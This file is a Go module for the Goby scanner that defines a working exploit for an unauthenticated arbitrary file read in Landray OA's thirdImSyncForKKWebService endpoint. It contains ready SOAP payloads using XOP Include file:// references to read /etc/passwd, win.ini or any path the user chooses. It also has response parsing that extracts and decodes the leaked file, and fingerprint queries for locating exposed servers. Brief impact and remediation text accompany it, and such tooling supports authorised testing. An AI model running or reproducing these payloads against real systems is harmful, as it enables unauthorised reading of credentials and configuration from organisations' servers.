package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Landray OA /sys/webservice/thirdImSyncForKKWebService File Read Vulnerability",
    "Description": "<p>Landray OA is a digital office system developed by Shenzhen Landray Software Co., Ltd., widely used in medium and large enterprises. The Landray OA /sys/webservice/thirdImSyncForKKWebService interface contains an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read important system files (such as database configuration files, system configuration files, etc.) without authentication, leading to sensitive information leakage and further threatening system security.</p>",
    "Product": "Landray OA-EKP",
    "Homepage": "https://www.landray.com.cn/",
    "DisclosureDate": "2024-12-18",
    "PostTime": "2024-12-25",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "GobyQuery": "body=\"lui_login_message_td\" || body=\"com.landray.kmss.km.archives.model.KmArchivesBorrow\" || body=\"return kmss_onsubmit()\" || body=\"SPRING_SECURITY_TARGET_URL\" || (title=\"欢迎登录智慧协同平台\" && body=\"欢迎登录智慧协同平台\") || body=\"蓝凌软件 版权所有\" || header=\"/resource/anonym.jsp\" || banner=\"/resource/anonym.jsp\"",
    "Level": "1",
    "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system without authorization, potentially leading to sensitive information leakage, data tampering, and further attacks.</p>",
    "Recommendation": "<p>1. Use firewalls and other security devices to set access policies and whitelist access.2. Disable public network access to the system unless necessary.3. Strictly validate and filter client input parameters to prevent unauthorized file access.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/144557080"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "c:/windows/win.ini,/etc/passwd",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "c:/windows/win.ini",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/thirdImSyncForKKWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----oxmmdmlnvlx08yluof5q",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------oxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.kk.im.third.kmss.landray.com/\">\r\n    <soapenv:Header/>\r\n    <soapenv:Body>\r\n        <web:getTodo>\r\n            <arg0>\r\n                <otherCond>1</otherCond>\r\n                <pageNo>1</pageNo>\r\n                <rowSize>1</rowSize>\r\n                <targets>1</targets>\r\n                <type><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///c:windows/win.ini\"/></type>\r\n            </arg0>\r\n        </web:getTodo>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\n------oxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/thirdImSyncForKKWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----oxmmdmlnvlx08yluof5q",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------oxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.kk.im.third.kmss.landray.com/\">\r\n    <soapenv:Header/>\r\n    <soapenv:Body>\r\n        <web:getTodo>\r\n            <arg0>\r\n                <otherCond>1</otherCond>\r\n                <pageNo>1</pageNo>\r\n                <rowSize>1</rowSize>\r\n                <targets>1</targets>\r\n                <type><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///etc/passwd\"/></type>\r\n            </arg0>\r\n        </web:getTodo>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\n------oxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "500",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Unmarshalling",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/sys/webservice/thirdImSyncForKKWebService",
                "follow_redirect": true,
                "header": {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
                    "Connection": "close",
                    "Content-Type": "multipart/related; boundary=----oxmmdmlnvlx08yluof5q",
                    "SOAPAction": ""
                },
                "data_type": "text",
                "data": "------oxmmdmlnvlx08yluof5q\r\nContent-Disposition: form-data; name=\"a\"\r\n\r\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://webservice.kk.im.third.kmss.landray.com/\">\r\n    <soapenv:Header/>\r\n    <soapenv:Body>\r\n        <web:getTodo>\r\n            <arg0>\r\n                <otherCond>1</otherCond>\r\n                <pageNo>1</pageNo>\r\n                <rowSize>1</rowSize>\r\n                <targets>1</targets>\r\n                <type><xop:Include xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" href=\"file:///{{{filePath}}}\"/></type>\r\n            </arg0>\r\n        </web:getTodo>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\n------oxmmdmlnvlx08yluof5q--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "[fonts]",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "result|lastbody|regex|Unmarshalling Error: Not a number: ([\\s\\S]*) </faultstring>",
                "output|define|base64_decode|{{{result}}}"
            ]
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "蓝凌OA /sys/webservice/thirdImSyncForKKWebService 文件读取漏洞",
            "Product": "蓝凌OA-EKP",
            "Description": "<p>蓝凌OA 是由深圳市蓝凌软件股份有限公司开发的一款数字化办公系统，广泛应用于大中型企业。蓝凌OA /sys/webservice/thirdImSyncForKKWebService 接口存在任意文件读取漏洞，攻击者可以利用该漏洞未经身份验证地读取系统重要文件（如数据库配置文件、系统配置文件等），从而导致敏感信息泄露，进一步威胁系统安全。</p>",
            "Recommendation": "<p>1. 通过防火墙等安全设备设置访问策略，设置白名单访问。2. 如非必要，禁止公网访问该系统。3. 在处理客户端输入的参数时，进行严格的验证和过滤，防止未授权的文件访问。</p>",
            "Impact": "<p>该漏洞允许攻击者未经授权读取系统中的任意文件，可能导致敏感信息泄露、数据篡改以及进一步的攻击行为。</p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Landray OA /sys/webservice/thirdImSyncForKKWebService File Read Vulnerability",
            "Product": "Landray OA-EKP",
            "Description": "<p>Landray OA is a digital office system developed by Shenzhen Landray Software Co., Ltd., widely used in medium and large enterprises. The Landray OA /sys/webservice/thirdImSyncForKKWebService interface contains an arbitrary file read vulnerability. Attackers can exploit this vulnerability to read important system files (such as database configuration files, system configuration files, etc.) without authentication, leading to sensitive information leakage and further threatening system security.</p>",
            "Recommendation": "<p>1. Use firewalls and other security devices to set access policies and whitelist access.2. Disable public network access to the system unless necessary.3. Strictly validate and filter client input parameters to prevent unauthorized file access.</p>",
            "Impact": "<p>This vulnerability allows attackers to read arbitrary files in the system without authorization, potentially leading to sensitive information leakage, data tampering, and further attacks.</p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "filePath": "switch|attackType|{{{default}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/sys/webservice/thirdImSyncForKKWebService"
    },
    "VariablesOrder": [
        "filePath",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9980"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}